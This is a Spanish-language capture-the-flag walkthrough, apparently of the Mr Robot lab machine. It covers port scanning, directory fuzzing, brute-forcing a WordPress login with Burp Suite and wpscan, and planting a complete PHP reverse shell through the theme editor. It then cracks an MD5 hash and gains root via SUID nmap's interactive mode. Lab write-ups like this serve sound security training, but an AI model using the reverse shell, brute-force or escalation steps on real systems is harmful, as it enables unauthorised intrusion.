#Linux #medium 
### nmap
```python
PORT    STATE SERVICE  REASON         VERSION
80/tcp  open  http     syn-ack ttl 63 Apache httpd
|_http-server-header: Apache
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html).
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
443/tcp open  ssl/http syn-ack ttl 63 Apache httpd
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
| ssl-cert: Subject: commonName=www.example.com
| Issuer: commonName=www.example.com
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2015-09-16T10:45:03
| Not valid after:  2025-09-13T10:45:03
| MD5:   3c16:3b19:87c3:42ad:6634:c1c9:d0aa:fb97
| SHA-1: ef0c:5fa5:931a:09a5:687c:a2c2:80c4:c792:07ce:f71b
| -----BEGIN CERTIFICATE-----
| MIIBqzCCARQCCQCgSfELirADCzANBgkqhkiG9w0BAQUFADAaMRgwFgYDVQQDDA93
| d3cuZXhhbXBsZS5jb20wHhcNMTUwOTE2MTA0NTAzWhcNMjUwOTEzMTA0NTAzWjAa
| MRgwFgYDVQQDDA93d3cuZXhhbXBsZS5jb20wgZ8wDQYJKoZIhvcNAQEBBQADgY0A
| MIGJAoGBANlxG/38e8Dy/mxwZzBboYF64tu1n8c2zsWOw8FFU0azQFxv7RPKcGwt
| sALkdAMkNcWS7J930xGamdCZPdoRY4hhfesLIshZxpyk6NoYBkmtx+GfwrrLh6mU
| yvsyno29GAlqYWfffzXRoibdDtGTn9NeMqXobVTTKTaR0BGspOS5AgMBAAEwDQYJ
| KoZIhvcNAQEFBQADgYEASfG0dH3x4/XaN6IWwaKo8XeRStjYTy/uBJEBUERlP17X
| 1TooZOYbvgFAqK8DPOl7EkzASVeu0mS5orfptWjOZ/UWVZujSNj7uu7QR4vbNERx
| ncZrydr7FklpkIN5Bj8SYc94JI9GsrHip4mpbystXkxncoOVESjRBES/iatbkl0=
|_-----END CERTIFICATE-----

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 23:40
Completed NSE at 23:40, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 23:40
Completed NSE at 23:40, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 23:40
Completed NSE at 23:40, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 67.73 seconds
           Raw packets sent: 131097 (5.768MB) | Rcvd: 33 (1.448KB)

```

### Tenemos el puerto 80 abierto. revisemos la pagina web:

![[Pasted image 20240612144849.png]]

### Tenemos informacion con los diferentes comandos que nos muuestas la pagina.
#### vamos hacer Fuzzing a la pagina web utilizando gobuster.

```c
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.142.38/simple -x php,txt,html -t 20
```

![[Pasted image 20240612144855.png]]

### gobuster nos muestra una cantidad bastante importante de directorios. en los cuales podemos destacar:

```c 
/login                (Status: 302) [Size: 0] [--> http://10.10.142.38/wp-login.php]
/admin                (Status: 301) [Size: 234] [--> http://10.10.142.38/admin/]
/wp-login             (Status: 200) [Size: 2664]
/license              (Status: 200) [Size: 309]
/readme               (Status: 200) [Size: 64]
/robots               (Status: 200) [Size: 41]
/wp-content           (Status: 301) [Size: 237] [--> http://10.10.142.38/wp-admin/]
/xmlrpc.php           (Status:POST)
```

### podemos ver la web principal que todo indica que es un WordPress. (wp-login) 

![[Pasted image 20240612144902.png]]

### verificamos el directorio (robots) el cual nos entrega como informacion un diccionario: fsociety.dic + key-1-of-3.txt
#### tenemos un diccionario que podemos usar para hacer fuerza bruta en la pagina y tambien tenemos la key.txt que es nuestra primera flag.

![[Pasted image 20240612144906.png]]

### Realiccemos un ataque tipo sniper utilizando el diccionario + burpsuite para intentar conseguir informacion

#### abrimos brupsuite e intentamos hacer una peticion en el directorio wp-login de la pagina principal y la interceptamos con burpsuite

![[Pasted image 20240612144910.png]]

### debemos enviar nuestra petición al intruder con (Ctrl + I) luego vamos al intruder buscamos la opcion de Payloads y cargamos el diccionario

![[Pasted image 20240612144914.png]]

### una vez tenemos todo cargado vamos a la opcion de positions y aqui debemos decirle al burpsuite en que parte de nuestra peticion debe hacer los cambios para ingresar el diccionario 

### primero vamos al username que utilizamos para hacer esta peticion. y agregamos el (add § ) al principio y al final del username. vamos a probar solo con el username para que de esta manera podamos asegurarnos que conseguimos un usuario en la pagina web. 

### revisamos el cuadro de ataque y vemos como se estan haciendo pruebas 1x1 de todos los usuarios que existen en la pagina. cada usuario tiene un codigo. todos tienen en mismo codigo y podemos ver solo 1 con un codigo diferente por que podemos intuir que este seria nuestro usuario.

## Username: Elliot

![[Pasted image 20240612144922.png]]

### probamos el usuario en la pagina y nos da como informacion:
###### la contraseña que hemos ingresado para el usuario elliot es incorrecta,

### sigamos con nuestro ataque. ahora intentemos con la contraseña

![[Pasted image 20240612144926.png]]

### mirando la ventana de ataques nos damos cuenta que el diccionario tiene muchas palabras repetidas asi que vamos a modificar el diccionario y eliminar todas las palabras que esten repetidas para optimizar tiempo.
### utilizando el comando:
```c
	wc fsocity.dic -l
	
	858160 fsocity.dic
```

### nuestro diccionario tiene 858160 palabras de las cuales muchas estan repetidas asi que vamos a memorar eso

```css 
	sort fsociety.dic | uniq > fsociety.dic_nuevo
	
```

### este comando nos ordena todo el diccionario alfabeticamente y tambien elimina las palabras repetidas y finalmente lo guarda en un nuevo archivo llamado: fsociety.dic_nuevo.

si hacemos nuevamente
```c
wc fsociety.dic_nuevo -l 
```
podemos ver que ahora nuestro nuevo diccionario tiene: 11451. esto esta mucho mejor asi que intentemos el ataque con el nuevo diccionario para ver si va mas rapido.

### Bueno, parece que a BurpSuite le cuesta hacer el ataque asi que investigando conseguimos una nueva herramienta (wpscan) que nos permite hacer ataques a paginas wordpress

```css
	wpscan -U Elliot -P fsociety.dic_nuevo --url http://IP/wp-login --multicall-max-passwords
```

![[Pasted image 20240612144941.png]]

### despues de casi 10 minutos tenemos los resultados.

### la contraseña para el usuario Elliot es:
```css
	ER28-0652
```

![[Pasted image 20240612144947.png]]

### ahora vamos a ingresar a la pagina web.

![[Pasted image 20240612144952.png]]

### vamos a navegar por la pagina y a enumerar toda la informacion que sea posible.

### en la pestaña de usuarios podemos encontrar dos usuarios:
```cs
Username: elliot
name: elliot Alderson
E-mail: elliot@mrrobot.com
role: administrator
-------------------------------------------------------------
Username: mich05654
name: krista Gordon
E-mail: kgordon@therapis.com
role: subscriber
```

### seguimos buscando información que nos sea útil. conseguimos una opción de apariencia de la pagina web que tiene un apartado de edición. aquí podemos ver archivos php. esto es información muy útil para nosotros.

![[Pasted image 20240612144959.png]]
![[Pasted image 20240612144959.png]]
### en este caso podriamos buscar exactamenta la direccion url donde estan almacenados estos template para de esa manera poder utilizar un codigo php para ejecutar una reverseshell

#### direccion url: 10.10.141.53/web-conten/themes/twentyfifteen

### parece que esta es la direccion donde estan almacenados estos archivos php. asi que utilizaremos el siguiente codigo para intentar conseguir una reverse shell.

```python
<?php
set_time_limit (0);
$VERSION = "1.0";
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 
```

### cambiamos el codigo php por nuestro codigo. editaos los parametros necesarios y actualizamos.

![[Pasted image 20240612145024.png]]

### ahora vamos a ingresar a la direccion url que hemos conseguido donde aparentemente se guardaron los cambios. pero primero debemos ponernos a la escucha por el puerto que hemos especificado. en este caso el 4444

![[Pasted image 20240612145028.png]]

### ahora vamos a navegar hasta la direccion url. en este caso es: 10.10.141.53/web-conten/themes/twentyfifteen/shell.php 
##### podemos ver que la pagina se queda cargando eso es buena señal

![[Pasted image 20240612145033.png]]

### perfecto. tenemos acceso. si escribimos el comando whoami podemos ver que somos el usuario daemon.

##### vamos hacer un tratamiento tty para que nuestra consola se vea un poco mejor:
```css
		script /dev/null -c bash 
```

### nos movemos hasta el escritorio, vemos dentro del directorio robot tenemos dos archivos, key-2-of-3.txt y password.raw-md5 parece que no tenemos permisos para abrir el archivo key-2-of-3.txt pero si podemos ver el password.raw-md5 el cual ya nos dice que esta encodeado en formato MD5

```cs
	c3fcd3d76192e4007dfb496cca67e13b
```

### podemos usar JohnTheRipper para intentar desencodear este archivo

```css
sudo john pass.hash --wordlist=fsociety.dic_nuevo --format=Raw-MD5
```

![[Pasted image 20240612145041.png]]

### guardamos esto en un archivo y lo vamos a transformar en minusculas que es lo mas probable. de igual forma tenemos que probar las dos opciones.

pasamos el codigo a minisculas
```css
tr '[:upper:]' '[:lower:]' < nuevo.hash > nuevo_minusculas.hash
```

## hacemos tratamiento de tty
cuando hacemos tratamiento de tty con el comando script /dev/null -c bash nos da problemas asi que usaremos este: 
```c
	python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### escalada de privilegios
# Enumeración básica sistema
```css
	find / -perm -4000 2>/dev/null
```

![[Pasted image 20240612145057.png]]
# Permisos sudo
```css
	/usr/local/bin/nmap
```

### parece que esta maquina tiene instalado nmap y lo podemos ejecutar como sudo. asi que vamos a explotar esta vulnerabilidad de la siguiente manera.

utilizamos el comando:
```css
	nmap --interactive
```

![[Pasted image 20240612145105.png]]

### este comando de nmap nos permite ejecutar codigo del sistema utilizando la herramienta nmap.

ahora ejecutamos el llamado de una bash con el siguiente codigo:
```c
	!bash -p
```
### WE ARE ROOT
